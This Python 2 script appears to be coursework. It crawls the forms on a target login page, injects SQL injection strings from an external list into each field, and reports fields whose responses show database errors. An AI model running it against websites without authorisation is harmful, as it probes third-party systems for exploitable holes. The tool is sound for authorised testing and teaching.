#!/usr/bin/python
__author__ = 'liteman'
'''
Kevin Romano
CFRS767
SQL Injection
'''

import os
import sys
import requests
import argparse
import re
from lxml.html import fromstring


sqlfile = "sqlilist.txt"  # list of SQLI strings to attempt
errorfile = "errorlist.txt"  # list of errors to look for in case of successful SQLI


def list_all_items(path):
    """
    Take the path to a file, or a single item
    @param path: if it is a path, read the file and return a list of values,
    if a string, return a list of one

    """

    retList = []
    if os.path.exists(path):
        f = open(path, 'r')
        for item in f.readlines():
            item = item.strip()
            if item == '':
                continue
            retList.append(item.strip())
        f.close()

        return retList

    else:
        retList.append(path)
    return retList

def getCookie(url, verbose=False):
    """
    Make an initial request to the specified URL and capture the assigned cookie
    :return: string containing the established cookie
    """
    if verbose:
        print "DEBUG: Retrieving cookie"

    initreq = requests.get(url)

    cookieStr = ""
    for key, value in initreq.cookies.items():
        cookieStr += key +"="+value + "; "

    if verbose:
        print "DEBUG: getCookie() Result: " + cookieStr[:-2]

    return initreq.cookies

def foundSQLErrors(webtext, verbose):
    '''

    :param text: The returned web text for a query
    :param verbose: Specifies level of debugging info to print
    :return: True if known error text is found in webtext, False otherwise
    '''
    if verbose:
        print "[DEBUG] Entered foundSQLErrors()"
    errorList = list_all_items(errorfile)

    for error in errorList:
        match = re.search(error, webtext)
        if match:
            if verbose:
                print "[DEBUG] Found error in text: " + error
            return True

    return False

def getFormInfo(webtext, formid, verbose, method=False, fields=False):
    '''

    :param webtext: HTML page as a string
    :param formid: In case of multiple forms, formid specifies which from to read
    :param verbose: Specified level of debugging
    :param method: Boolean value. If true, return the form submission method (GET or POST)
    :param fields: Boolean value. If true, return the input fields in the form
    :return: If both method and fields are true, return a tuple of method, fields dict.
    '''
    if verbose:
        print "[DEBUG] Entered getFormInfo() function"
    form_page = fromstring(webtext)
    try:
        form = form_page.forms[formid]  # for this assignment, assume exactly one form exists on the page
    except IndexError:
        print "No HTML form detected on the page. Check the specified URL and try again"
        sys.exit(1)

    if verbose:
        print "[DEBUG] Form: " + str(form)
        print "[DEBUG] Method: " + str(form.method)

    if method is True and fields is True:
        return form.method, form.fields
    elif method is True:
        return form.method
    elif fields is True:
        return form.fields


def getTestableFields(allfields, verbose):
    '''
    This function returns a list of fields to test for SQLI. It will omit the Login/Submit button from testing
    :param allfields: Dictionary containing form fields and any default values
    :param verbose: Specify level of debugging
    :return: List of fields to test for SQLI
    '''
    if verbose:
        print "[DEBUG] Entered getTestableFields()"
        print "[DEBUG] allfields: " + str(allfields.items())

    testable = []
    for key, value in allfields.items():
        if value is None:
            testable.append(key)
        elif value.lower() != 'login' and value.lower() != 'submit':
            testable.append(key)

    if verbose:
        print "[DEBUG] testable: " + str(testable)

    return testable

def trySQLI(url, candidate, allfields, testable, cookie, method, verbose):
    '''

    :param url: Web Address requests will be sent to
    :param candidate: The form field to be tested
    :param allfields: The dict of all fields in the form
    :param testable: List of fields that will need "bogus" data filled in
    :param cookie: Cookie to maintain session state
    :param method: GET/POST - method to submit the form
    :param verbose: Specify level of debugging
    :return: List of successful SQLI strings
    '''

    sqllist = list_all_items(sqlfile)

    resultList = []  # save any successful SQLI strings here

    # fill in bogus data
    for field in testable:
        allfields[field] = "bogus"

    # loop through SQLI strings and submit requests
    for sql in sqllist:
        allfields[candidate] = sql  # change candidate field to SQLI string
        if method == "POST":
            attempt = requests.post(url, data=allfields.items(), cookies=cookie)
        elif method =="GET":
            attempt = requests.get(url, params=allfields.items(), cookies=cookie)

        if foundSQLErrors(attempt.text, verbose):
            resultList.append(sql)

    return resultList


def runBruteForce(url, cookie, verbose=False):
    """

    :param url: URL to login page
    :param users:  list of users to try
    :param pws: list of passwords to try
    :param verbose: False by default. If true, display debug strings
    :return: list of successful user/pw combinations
    """

    print "[+] Starting brute force"
    print "\tAttacking URL: " + url

    #Perform a GET to capture the HTML
    initreq = requests.get(url, cookies=cookie)
    webtext = initreq.text

    #determine number of forms on the page
    form_page = fromstring(webtext)
    numforms = len(form_page.forms)

    #brute force each form on the page
    for i in range(numforms):
        # identify form method and input fields
        method, allfields = getFormInfo(webtext, i, verbose, method=True, fields=True)

        # identify testable fields
        testable = getTestableFields(allfields, verbose)

        #For each testable field, call function to try each sqli string
        for candidate in testable:
            print "\tTesting field: " + candidate
            successList = trySQLI(url, candidate, allfields, testable, cookie, method, verbose)
            if len(successList) > 0:  # potential SQLI found
                for item in successList:
                    print "\t\t[-]Potential SQL injection with: " + item


def formatCookie(cookieStr):
    """
    Takes a string of cookie data and puts it into a dictionary format that Requests will understand
    :param cookieStr:
    :return: dict of cookie data
    """

    crumbs = cookieStr.split()
    cookiedict = {}
    for item in crumbs:
        item = item.strip(';')
        tmp = item.split('=')
        cookiedict[tmp[0]] = tmp[1]

    return cookiedict

def begin(args):
    """
    Function that will control the flow of the program and verify parameters
    :param args: command-line arguments
    :return: None
    """
    global sqlfile
    global errorfile

    if args.verbose:
        print "DEBUG: Begin processing..."

    if args.list:
        sqlfile = args.list

    if not os.path.exists(sqlfile):
        print "Error: Unable to find sqli strings list: " + sqlfile
        print "Exiting.."
        sys.exit(1)

    if not args.cookie:
        cookiedict = getCookie(args.url, args.verbose)
    else:
        cookiedict = formatCookie(args.cookie)

    if args.verbose:
        print "DEBUG: Cookie set: " + str(cookiedict)

    runBruteForce(args.url, cookiedict, args.verbose)


def main():

    parser = argparse.ArgumentParser(description="SQL Injection Enumerator", add_help=True)

    parser.add_argument('-v', '--verbose',
                        help="Include additional debug output",
                        action='store_true',
                        required=False)
    parser.add_argument('-u', '--url',
                        help="URL (or path to url list) to the login page you wish to attack",
                        metavar="URL or PATH",
                        required=True)
    parser.add_argument('-l', '--list',
                        help="Path to a text file containing list of sqli strings",
                        metavar="PATH",
                        required=False)
    parser.add_argument('-c', '--cookie',
                        help="Cookie to use in the HTTP headers",
                        metavar="<string>",
                        required=False)

    args = parser.parse_args()

    if args.verbose:
        print "Debugging on."

    begin(args)


main()
